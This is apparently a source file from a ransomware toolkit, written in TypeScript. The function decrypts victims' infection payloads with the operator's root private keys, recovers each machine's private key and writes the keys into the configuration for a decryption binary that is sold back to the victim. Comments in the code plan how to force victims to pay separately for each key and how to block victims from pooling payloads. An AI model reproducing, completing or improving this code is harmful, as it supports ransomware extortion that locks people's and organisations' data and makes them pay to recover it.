import {
  MachineDecryptionKeys,
  asymmetric,
  hash,
  isValidBase64,
} from "ransomkcommon";
import {
  DECRYPT_BIN_CONFIG_FILE_PATH,
  readCurrentRootConfig,
  readJsonFile,
  writeJsonFile,
} from "./config";

export async function generateAndSetDecryptionHashTable(
  infections: string[]
): Promise<void> {
  const rootConfig = readCurrentRootConfig();

  const decryptionHashTable: Record<string, MachineDecryptionKeys> = {};

  if (typeof rootConfig.keys === "undefined") {
    throw Error(
      `Invalid rootPrivateKey base64: [${rootConfig.active}] was provided`
    );
  }

  const { keys: rootKeys } = rootConfig;

  const rootKeysByPublicKeyHash = Object.keys(rootKeys)
    .map((k) => Buffer.from(k, "base64"))
    .map((publicKey) => ({
      [hash(publicKey).toString("hex")]: rootKeys[publicKey.toString("base64")],
    }))
    .reduce((acc, e) => ({ ...acc, ...e }), {});

  const usedKeys: Set<string> = new Set();

  for (const infection of infections) {
    if (!isValidBase64(infection)) {
      throw Error(`${infection} is not a valid base64 string`);
    }

    const payloadBase64 = Buffer.from(infection, "base64");

    const payloadAsJsonString = payloadBase64.toString("utf8");

    let parsedPayload: [string, string];

    try {
      const parsed = JSON.parse(payloadAsJsonString);

      if (!Array.isArray(parsed)) {
        continue;
      } else if (parsed.length !== 2) {
        continue;
      } else if (!isValidBase64(parsed[1])) {
        continue;
      }

      parsedPayload = parsed as unknown as [string, string];
    } catch (e) {
      console.log(e);
      continue;
    }

    const [rootPublicKeyHash, encryptedPayloadBase64] = parsedPayload;

    // 1 decryption file must contain the decryption keys for only 1 key
    if (usedKeys.size === 1) {
      if (usedKeys.has(rootPublicKeyHash)) {
        /** Ok */
      } else {
        /** The victim's payload contains more than 1 key, so it must pay 2x times for 2 different decryption binaries. */
        /**
         * This may happen when:
         * 1. The victim did execute multiple ransomwares with multiple keys.
         * 2. Two or more victims are merging their payload files into a single one to pay only once.
         */
        /** Anyway, just skip */
        continue;
      }
    } else {
      if (usedKeys.size === 0) {
        usedKeys.add(rootPublicKeyHash);
      }
    }

    if (usedKeys.size > 1) {
      // Even if there's a flaw in the logic, it will not allow pass
      throw Error(
        `A single decryption binary is not allowed to decrypt multiple keys`
      );
    }

    const { rootPrivateKey: rootPrivateKeyBase64 } =
      rootKeysByPublicKeyHash[rootPublicKeyHash] ?? {};

    if (typeof rootPrivateKeyBase64 !== "string") {
      throw Error(
        "Incompatible keys, we do not own the decrypt key of the target machine."
      );
    }

    const rootPrivateKey = Buffer.from(rootPrivateKeyBase64, "base64");

    const rootPublicKey = await asymmetric.getPublicKeyFromPrivateKey(
      rootPrivateKey
    );

    const payloadJson = await asymmetric.decrypt(
      Buffer.from(encryptedPayloadBase64, "base64"),
      rootPrivateKey
    );

    let payloadInfectionData = undefined;

    try {
      payloadInfectionData = JSON.parse(payloadJson.toString("utf8"));

      if (typeof payloadInfectionData !== "object") {
        throw Error("Payload is not an object.");
      }

      if (
        typeof payloadInfectionData.encryptedMachineSpecificPrivateKey !==
        "string"
      ) {
        throw Error(
          `[payload.encryptedMachineSpecificPrivateKey] is not a string: ${payloadInfectionData?.encryptedMachineSpecificPrivateKey?.toString()}`
        );
      }

      if (Object.keys(payloadInfectionData).length !== 1) {
        throw Error(`Additional object fields for [payload] is not allowed.`);
      }
    } catch (e) {
      return console.log(
        `Malformatted payload: ${JSON.stringify(
          payloadInfectionData ?? {},
          null,
          2
        )}\n${e}`
      );
    }

    const {
      encryptedMachineSpecificPrivateKey:
        encryptedMachineSpecificPrivateKeyBase64,
    } = payloadInfectionData;

    const encryptedMachineSpecificPrivateKey = Buffer.from(
      encryptedMachineSpecificPrivateKeyBase64,
      "base64"
    );

    const machineSpecificPrivateKey = await asymmetric.decrypt(
      encryptedMachineSpecificPrivateKey,
      rootPrivateKey
    );

    const machineSpecificPublicKey =
      await asymmetric.getPublicKeyFromPrivateKey(machineSpecificPrivateKey);
    const machineSpecificPublicKeyHash = hash(machineSpecificPublicKey);

    decryptionHashTable[machineSpecificPublicKeyHash.toString("hex")] = {
      machineSpecificPrivateKey: machineSpecificPrivateKey.toString("base64"),
      machineSpecificPublicKey: (
        await asymmetric.getPublicKeyFromPrivateKey(machineSpecificPrivateKey)
      ).toString("base64"),
      rootPublicKeyHashBase64: hash(rootPublicKey).toString("hex"),
    };
  }

  writeJsonFile(DECRYPT_BIN_CONFIG_FILE_PATH, {
    ...readJsonFile(DECRYPT_BIN_CONFIG_FILE_PATH),
    decryptionHashTable,
    rootPublicKeyHash: [...usedKeys.values()][0],
  });
}
